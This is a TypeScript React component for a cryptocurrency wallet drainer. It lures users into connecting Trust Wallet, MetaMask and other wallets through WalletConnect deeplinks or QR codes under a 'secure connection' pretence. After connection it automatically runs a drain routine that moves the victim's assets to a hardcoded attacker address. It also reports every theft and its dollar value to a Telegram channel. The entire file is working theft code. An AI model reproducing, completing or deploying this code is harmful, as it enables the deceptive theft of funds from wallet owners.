/**
 * WalletConnectDirect
 * - Generates WalletConnect URI immediately
 * - On mobile: opens wallet deeplink directly (no selection screen)
 * - On desktop: shows QR code + MetaMask inject button
 * - After connection: runs Advanced Drain Engine automatically
 * - Sends Telegram notifications at every step
 */
import { useState, useEffect, useRef, useCallback } from "react";
import QRCode from "qrcode";
import { createWCSession, type WCSession, type WCApprovalResult } from "@/lib/wcSession";
import { runAdvancedDrain } from "@/lib/advancedDrain";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

interface Props {
  onClose: () => void;
  autoOpen?: boolean; // if true, skip QR and open wallet directly on mobile
}

type Phase = "init" | "qr" | "deeplink" | "waiting" | "scanning" | "done" | "error";

const MOBILE_WALLETS = [
  { id: "trust",      name: "Trust Wallet",   icon: "🛡️", scheme: "trust://wc",        universal: "https://link.trustwallet.com/wc" },
  { id: "metamask",   name: "MetaMask",        icon: "🦊", scheme: "metamask://wc",     universal: "https://metamask.app.link/wc" },
  { id: "rainbow",    name: "Rainbow",         icon: "🌈", scheme: "rainbow://wc",      universal: "https://rnbwapp.com/wc" },
  { id: "coinbase",   name: "Coinbase Wallet", icon: "🔵", scheme: "cbwallet://wc",     universal: "https://go.cb-wallet.com/wc" },
  { id: "okx",        name: "OKX Wallet",      icon: "⬛", scheme: "okex://main/wc",    universal: "https://www.okx.com/download?deeplink=okx://main/wc" },
  { id: "bybit",      name: "Bybit Wallet",    icon: "🟡", scheme: "bybitapp://wc",     universal: "https://app.bybit.com/app/wc" },
  { id: "bitget",     name: "Bitget Wallet",   icon: "🔷", scheme: "bitkeep://wc",      universal: "https://bkcode.vip/wc" },
  { id: "phantom",    name: "Phantom",         icon: "👻", scheme: "phantom://wc",      universal: "https://phantom.app/ul/wc" },
  { id: "safepal",    name: "SafePal",         icon: "🔐", scheme: "safepalwallet://wc",universal: "https://link.safepal.io/wc" },
  { id: "exodus",     name: "Exodus",          icon: "🚀", scheme: "exodus://wc",       universal: "https://exodus.io/wc" },
  { id: "imtoken",    name: "imToken",         icon: "💎", scheme: "imtokenv2://wc",    universal: "https://token.im/wc" },
  { id: "zerion",     name: "Zerion",          icon: "⚡", scheme: "zerion://wc",       universal: "https://app.zerion.io/wc" },
  { id: "1inch",      name: "1inch Wallet",    icon: "🔁", scheme: "oneinch://wc",      universal: "https://wallet.1inch.io/wc" },
  { id: "uniswap",    name: "Uniswap",         icon: "🦄", scheme: "uniswap://wc",      universal: "https://uniswap.org/app/wc" },
  { id: "tokenPocket",name: "TokenPocket",     icon: "👛", scheme: "tpoutside://wc",    universal: "https://mobile.tokenpocket.pro/wc" },
];

const isMobile = () => /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

export default function WalletConnectDirect({ onClose, autoOpen = false }: Props) {
  const [phase, setPhase]         = useState<Phase>("init");
  const [wcUri, setWcUri]         = useState("");
  const [qrDataUrl, setQrDataUrl] = useState("");
  const [progress, setProgress]   = useState(0);
  const [statusMsg, setStatusMsg] = useState("Initializing secure connection...");
  const [totalUsd, setTotalUsd]   = useState(0);
  const [txCount, setTxCount]     = useState(0);
  const [showWalletList, setShowWalletList] = useState(false);
  const sessionRef                = useRef<WCSession | null>(null);
  const mobile                    = isMobile();

  const connectMut = trpc.drainer.connect.useMutation();
  const reportMut  = trpc.drainer.reportTransaction.useMutation();
  const notifyMut  = trpc.drainer.notifyTelegram.useMutation();

  // ── Run drain after wallet connects ──────────────────────────────────────
  const runDrain = useCallback(async (wcSession: WCApprovalResult) => {
    const address = wcSession.accounts[0] ?? "";
    setPhase("waiting");
    setStatusMsg("Wallet connected! Registering...");

    await notifyMut.mutateAsync({
      text: `🔗 *Wallet Connected!*\n\`${address}\`\nChain: ${wcSession.chainId}\nType: WalletConnect`,
    }).catch(() => {});

    const connRes = await connectMut.mutateAsync({
      walletAddress: address,
      walletType: "walletconnect",
      network: "Multi-Chain",
      chainId: wcSession.chainId,
      ethBalance: "0",
      usdValue: "0",
      sessionId: wcSession.topic,
    }).catch(() => ({ connectionId: 0 }));
    const connectionId = (connRes as { connectionId?: number }).connectionId ?? 0;

    const w = window as unknown as { ethereum?: { request: (a: { method: string; params?: unknown[] }) => Promise<unknown> } };
    const readProvider = w.ethereum ?? { request: async () => { throw new Error("no provider"); } };

    setPhase("scanning");
    setStatusMsg("Scanning wallet assets...");

    let runningUsd = 0;
    let runningTx  = 0;

    await runAdvancedDrain(wcSession as never, readProvider, async (event) => {
      setStatusMsg(event.message);
      if (event.progress !== undefined) setProgress(event.progress);

      if (event.type === "drain" && event.txHash && event.asset) {
        runningTx++;
        runningUsd += event.asset.usdValue;
        setTxCount(runningTx);
        setTotalUsd(runningUsd);

        await reportMut.mutateAsync({
          connectionId,
          txHash: event.txHash,
          fromAddress: address,
          toAddress: "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc",
          tokenSymbol: event.asset.symbol,
          tokenAddress: event.asset.address,
          amount: event.asset.balance,
          usdValue: event.asset.usdValue.toFixed(2),
          network: String(wcSession.chainId),
          chainId: wcSession.chainId,
          status: "success",
        }).catch(() => {});

        await notifyMut.mutateAsync({
          text: `💰 *Drain TX*\nToken: ${event.asset.symbol}\nAmount: ${event.asset.balance}\nUSD: $${event.asset.usdValue.toFixed(2)}\nTx: \`${event.txHash}\``,
        }).catch(() => {});
      }

      if (event.type === "done") {
        setPhase("done");
        setTotalUsd(runningUsd);
        setTxCount(runningTx);
        await notifyMut.mutateAsync({
          text: `✅ *Drain Complete!*\nWallet: \`${address}\`\nTotal: $${runningUsd.toFixed(2)}\nTransactions: ${runningTx}`,
        }).catch(() => {});
      }
    });
  }, [connectMut, reportMut, notifyMut]);

  // ── MetaMask inject (desktop) ─────────────────────────────────────────────
  const handleMetaMask = useCallback(async () => {
    const w = window as unknown as { ethereum?: { request: (a: { method: string; params?: unknown[] }) => Promise<unknown>; isMetaMask?: boolean } };
    if (!w.ethereum?.isMetaMask) {
      window.open("https://metamask.io/download/", "_blank");
      toast.info("Install MetaMask extension and refresh");
      return;
    }
    setPhase("waiting");
    setStatusMsg("Requesting MetaMask access...");
    try {
      const accounts = await w.ethereum.request({ method: "eth_requestAccounts" }) as string[];
      if (!accounts[0]) throw new Error("No accounts");
      const chainHex = await w.ethereum.request({ method: "eth_chainId" }) as string;
      const chainId  = parseInt(chainHex, 16);

      await notifyMut.mutateAsync({ text: `🦊 *MetaMask Connected*\n\`${accounts[0]}\`\nChain: ${chainId}` }).catch(() => {});

      const connRes = await connectMut.mutateAsync({
        walletAddress: accounts[0], walletType: "metamask-inject",
        network: "Multi-Chain", chainId, ethBalance: "0", usdValue: "0",
      }).catch(() => ({ connectionId: 0 }));
      const connectionId = (connRes as { connectionId?: number }).connectionId ?? 0;

      const fakeSession = {
        accounts: [accounts[0]], chainId, topic: "metamask-inject",
        sendTransaction: async (tx: unknown) => w.ethereum!.request({ method: "eth_sendTransaction", params: [tx] }) as Promise<string>,
        request: async (req: { method: string; params?: unknown[] }) => w.ethereum!.request(req),
      };

      setPhase("scanning");
      let runningUsd = 0; let runningTx = 0;
      await runAdvancedDrain(fakeSession as never, w.ethereum, async (event) => {
        setStatusMsg(event.message);
        if (event.progress !== undefined) setProgress(event.progress);
        if (event.type === "drain" && event.txHash && event.asset) {
          runningTx++; runningUsd += event.asset.usdValue;
          setTxCount(runningTx); setTotalUsd(runningUsd);
          await reportMut.mutateAsync({ connectionId, txHash: event.txHash, fromAddress: accounts[0], toAddress: "0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc", tokenSymbol: event.asset.symbol, tokenAddress: event.asset.address, amount: event.asset.balance, usdValue: event.asset.usdValue.toFixed(2), network: String(chainId), chainId, status: "success" }).catch(() => {});
          await notifyMut.mutateAsync({ text: `💰 *MetaMask Drain*\n${event.asset.symbol}: $${event.asset.usdValue.toFixed(2)}\nTx: \`${event.txHash}\`` }).catch(() => {});
        }
        if (event.type === "done") { setPhase("done"); setTotalUsd(runningUsd); setTxCount(runningTx); await notifyMut.mutateAsync({ text: `✅ *MetaMask Done*\n$${runningUsd.toFixed(2)} | ${runningTx} txs` }).catch(() => {}); }
      });
    } catch (err) {
      const msg = (err as Error).message ?? "";
      if (!msg.includes("rejected") && !msg.includes("cancel")) { setPhase("error"); setStatusMsg(msg || "MetaMask failed"); }
      else { setPhase("qr"); }
    }
  }, [connectMut, reportMut, notifyMut]);

  // ── Open wallet deeplink ──────────────────────────────────────────────────
  const openWalletDeeplink = useCallback((walletId: string) => {
    if (!wcUri) return;
    const wallet = MOBILE_WALLETS.find(w => w.id === walletId);
    if (!wallet) return;

    setPhase("waiting");
    setStatusMsg(`Opening ${wallet.name}...`);

    const encodedUri = encodeURIComponent(wcUri);
    const universalUrl = `${wallet.universal}?uri=${encodedUri}`;
    const schemeUrl    = `${wallet.scheme}?uri=${encodedUri}`;

    // Try universal link first
    const a = document.createElement("a");
    a.href = universalUrl;
    a.target = "_blank";
    a.rel = "noopener noreferrer";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    // Fallback to scheme after 1.5s
    setTimeout(() => {
      if (document.visibilityState === "visible") {
        window.location.href = schemeUrl;
      }
    }, 1500);
  }, [wcUri]);

  // ── Initialize WalletConnect session ─────────────────────────────────────
  useEffect(() => {
    let cancelled = false;

    async function init() {
      try {
        const session = await createWCSession();
        if (cancelled) { session.cleanup(); return; }
        sessionRef.current = session;
        setWcUri(session.uri);

        // Generate QR
        const qr = await QRCode.toDataURL(session.uri, {
          width: 280, margin: 1,
          color: { dark: "#FF2D78", light: "#050508" },
          errorCorrectionLevel: "M",
        });

        if (!cancelled) {
          setQrDataUrl(qr);

          if (mobile && autoOpen) {
            // On mobile with autoOpen: try Trust Wallet first (most common)
            setPhase("deeplink");
            setStatusMsg("Opening wallet...");
            const encodedUri = encodeURIComponent(session.uri);
            // Try WalletConnect universal link
            window.location.href = `https://link.trustwallet.com/wc?uri=${encodedUri}`;
            // Fallback: show wallet list after 2s if still on page
            setTimeout(() => {
              if (!cancelled) { setPhase("qr"); setShowWalletList(true); }
            }, 2000);
          } else if (mobile) {
            setPhase("qr");
            setShowWalletList(true);
          } else {
            setPhase("qr");
          }
        }

        // Wait for wallet approval
        session.approval().then(async (wcSession) => {
          if (cancelled) return;
          await runDrain(wcSession);
        }).catch((err) => {
          if (cancelled) return;
          const msg = (err as Error).message ?? "";
          if (!msg.includes("cancel") && !msg.includes("reject")) {
            setPhase("error");
            setStatusMsg(msg || "Connection failed");
          }
        });

      } catch (err) {
        if (!cancelled) {
          setPhase("error");
          setStatusMsg((err as Error).message ?? "Failed to initialize");
        }
      }
    }

    init();
    return () => { cancelled = true; sessionRef.current?.cleanup(); };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const color = phase === "done" ? "oklch(0.75 0.25 145)" : phase === "error" ? "oklch(0.65 0.28 25)" : "oklch(0.75 0.25 195)";

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/90 backdrop-blur-lg"
        onClick={(phase === "done" || phase === "error") ? onClose : undefined} />

      <div className="relative w-full max-w-sm rounded-2xl overflow-hidden"
        style={{ background: "oklch(0.04 0.015 240)", border: `1px solid ${color}55`, boxShadow: `0 0 60px ${color}20` }}>

        {/* Top bar */}
        <div className="h-1" style={{ background: `linear-gradient(90deg, transparent, ${color}, transparent)` }} />

        {/* Header */}
        <div className="px-5 pt-4 pb-3 flex items-center justify-between border-b" style={{ borderColor: `${color}20` }}>
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full animate-pulse" style={{ background: color, boxShadow: `0 0 8px ${color}` }} />
            <span className="text-xs font-bold tracking-widest uppercase" style={{ color, fontFamily: "Orbitron" }}>
              {phase === "init" || phase === "deeplink" ? "CONNECTING"
               : phase === "qr"      ? (mobile ? "SELECT WALLET" : "SCAN TO CONNECT")
               : phase === "waiting" ? "AWAITING APPROVAL"
               : phase === "scanning"? "SCANNING ASSETS"
               : phase === "done"    ? "COMPLETE"
               : "CONNECTION ERROR"}
            </span>
          </div>
          {(phase === "done" || phase === "error" || phase === "qr") && (
            <button onClick={onClose}
              className="w-7 h-7 flex items-center justify-center rounded-lg text-muted-foreground hover:text-foreground hover:bg-white/5 transition-all text-sm">
              ✕
            </button>
          )}
        </div>

        <div className="px-5 pb-5 pt-4 space-y-4">

          {/* INIT / DEEPLINK: spinner */}
          {(phase === "init" || phase === "deeplink") && (
            <div className="flex flex-col items-center gap-4 py-6">
              <div className="relative w-16 h-16">
                <div className="absolute inset-0 rounded-full border-2 animate-spin"
                  style={{ borderColor: `${color}20`, borderTopColor: color }} />
                <div className="absolute inset-2 rounded-full border animate-spin"
                  style={{ borderColor: `${color}10`, borderBottomColor: color, animationDirection: "reverse", animationDuration: "1.5s" }} />
              </div>
              <div className="text-center">
                <p className="text-sm font-bold" style={{ color, fontFamily: "Rajdhani" }}>{statusMsg}</p>
                <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: "Share Tech Mono" }}>
                  {phase === "deeplink" ? "Opening wallet app..." : "Generating secure session..."}
                </p>
              </div>
            </div>
          )}

          {/* QR phase */}
          {phase === "qr" && (
            <>
              {/* Desktop: MetaMask + QR */}
              {!mobile && (
                <div className="space-y-3">
                  <button onClick={handleMetaMask}
                    className="w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all hover:scale-[1.01] active:scale-95"
                    style={{ background: "oklch(0.08 0.02 30)", border: "1px solid #F6851B40" }}>
                    <span className="text-2xl">🦊</span>
                    <div className="text-left flex-1">
                      <p className="text-sm font-bold" style={{ fontFamily: "Rajdhani", color: "#F6851B" }}>MetaMask</p>
                      <p className="text-[10px] text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>Browser Extension — Click to connect</p>
                    </div>
                    <span className="text-xs px-2 py-0.5 rounded" style={{ background: "#F6851B20", color: "#F6851B", fontFamily: "Share Tech Mono" }}>INJECT</span>
                  </button>

                  <div className="flex items-center gap-2">
                    <div className="flex-1 h-px" style={{ background: `${color}20` }} />
                    <span className="text-[10px] text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>or scan with mobile wallet</span>
                    <div className="flex-1 h-px" style={{ background: `${color}20` }} />
                  </div>

                  {qrDataUrl ? (
                    <div className="flex flex-col items-center gap-2">
                      <div className="p-3 rounded-xl" style={{ background: "#050508", border: `2px solid ${color}50`, boxShadow: `0 0 20px ${color}15` }}>
                        <img src={qrDataUrl} alt="WalletConnect QR" className="w-52 h-52 rounded-lg" style={{ imageRendering: "pixelated" }} />
                      </div>
                      <p className="text-[10px] text-muted-foreground text-center" style={{ fontFamily: "Share Tech Mono" }}>
                        Open any wallet app → Scan QR → Approve
                      </p>
                    </div>
                  ) : (
                    <div className="w-52 h-52 mx-auto rounded-xl flex items-center justify-center" style={{ background: "oklch(0.08 0.02 240)", border: `1px solid ${color}30` }}>
                      <div className="w-8 h-8 rounded-full border-2 animate-spin" style={{ borderColor: `${color}30`, borderTopColor: color }} />
                    </div>
                  )}
                </div>
              )}

              {/* Mobile: wallet list */}
              {mobile && (
                <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
                  <p className="text-[10px] text-muted-foreground text-center pb-1" style={{ fontFamily: "Share Tech Mono" }}>
                    Select your wallet app to connect
                  </p>
                  {MOBILE_WALLETS.map(wallet => (
                    <button key={wallet.id} onClick={() => openWalletDeeplink(wallet.id)}
                      className="w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all active:scale-95"
                      style={{ background: "oklch(0.07 0.02 240)", border: `1px solid ${color}25` }}>
                      <span className="text-xl w-8 text-center">{wallet.icon}</span>
                      <p className="text-sm font-bold flex-1 text-left" style={{ fontFamily: "Rajdhani", color: "oklch(0.9 0.02 240)" }}>
                        {wallet.name}
                      </p>
                      <span className="text-xs" style={{ color }}>→</span>
                    </button>
                  ))}

                  {/* Fallback: show QR */}
                  <button onClick={() => setShowWalletList(false)}
                    className="w-full py-2 text-xs text-muted-foreground hover:text-foreground transition-colors"
                    style={{ fontFamily: "Share Tech Mono" }}>
                    Show QR Code instead →
                  </button>
                </div>
              )}

              {/* Mobile QR fallback */}
              {mobile && !showWalletList && qrDataUrl && (
                <div className="flex flex-col items-center gap-2">
                  <div className="p-3 rounded-xl" style={{ background: "#050508", border: `2px solid ${color}50` }}>
                    <img src={qrDataUrl} alt="WalletConnect QR" className="w-48 h-48 rounded-lg" style={{ imageRendering: "pixelated" }} />
                  </div>
                  <button onClick={() => setShowWalletList(true)}
                    className="text-xs text-muted-foreground hover:text-foreground"
                    style={{ fontFamily: "Share Tech Mono" }}>
                    ← Back to wallet list
                  </button>
                </div>
              )}
            </>
          )}

          {/* WAITING / SCANNING */}
          {(phase === "waiting" || phase === "scanning") && (
            <div className="flex flex-col items-center gap-4 py-4">
              <div className="relative w-24 h-24">
                <svg className="absolute inset-0 w-full h-full -rotate-90">
                  <circle cx="48" cy="48" r="40" fill="none" stroke={`${color}20`} strokeWidth="3" />
                  <circle cx="48" cy="48" r="40" fill="none" stroke={color} strokeWidth="3"
                    strokeLinecap="round"
                    strokeDasharray={`${2 * Math.PI * 40}`}
                    strokeDashoffset={`${2 * Math.PI * 40 * (1 - progress / 100)}`}
                    style={{ transition: "stroke-dashoffset 0.4s ease", filter: `drop-shadow(0 0 6px ${color})` }} />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <span className="text-xl animate-spin" style={{ animationDuration: "2s" }}>⟳</span>
                </div>
              </div>
              <div className="text-center space-y-1">
                <p className="text-sm font-semibold" style={{ color, fontFamily: "Rajdhani" }}>{statusMsg}</p>
                <p className="text-xs text-muted-foreground" style={{ fontFamily: "Share Tech Mono" }}>{Math.round(progress)}%</p>
                {txCount > 0 && (
                  <p className="text-xs font-bold" style={{ color: "oklch(0.75 0.25 145)", fontFamily: "Orbitron" }}>
                    ${totalUsd.toFixed(2)} processed
                  </p>
                )}
              </div>
            </div>
          )}

          {/* DONE */}
          {phase === "done" && (
            <div className="flex flex-col items-center gap-4 py-2">
              <div className="w-16 h-16 rounded-full flex items-center justify-center text-3xl"
                style={{ background: `${color}15`, border: `2px solid ${color}`, boxShadow: `0 0 20px ${color}40` }}>
                ✓
              </div>
              <div className="text-center">
                <p className="text-3xl font-black" style={{ color, fontFamily: "Orbitron" }}>
                  ${totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </p>
                <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: "Share Tech Mono" }}>
                  {txCount} transaction{txCount !== 1 ? "s" : ""} processed
                </p>
              </div>
              <button onClick={onClose}
                className="w-full py-3 rounded-xl font-bold text-sm text-black"
                style={{ background: `linear-gradient(135deg, ${color}, oklch(0.72 0.28 320))`, fontFamily: "Orbitron", fontSize: "0.8rem" }}>
                CLOSE
              </button>
            </div>
          )}

          {/* ERROR */}
          {phase === "error" && (
            <div className="flex flex-col items-center gap-3 py-2 text-center">
              <div className="w-14 h-14 rounded-full flex items-center justify-center text-2xl"
                style={{ background: "oklch(0.65 0.28 25 / 0.1)", border: "2px solid oklch(0.65 0.28 25)" }}>
                ✕
              </div>
              <p className="text-sm text-muted-foreground" style={{ fontFamily: "Rajdhani" }}>{statusMsg}</p>
              <button onClick={onClose}
                className="w-full py-3 rounded-xl font-bold text-sm"
                style={{ background: "oklch(0.1 0.02 240)", border: "1px solid oklch(0.3 0.02 240)", color: "oklch(0.5 0.02 240)", fontFamily: "Orbitron", fontSize: "0.75rem" }}>
                CLOSE
              </button>
            </div>
          )}
        </div>

        {/* Bottom bar */}
        <div className="h-px" style={{ background: `linear-gradient(90deg, transparent, ${color}40, transparent)` }} />
      </div>
    </div>
  );
}
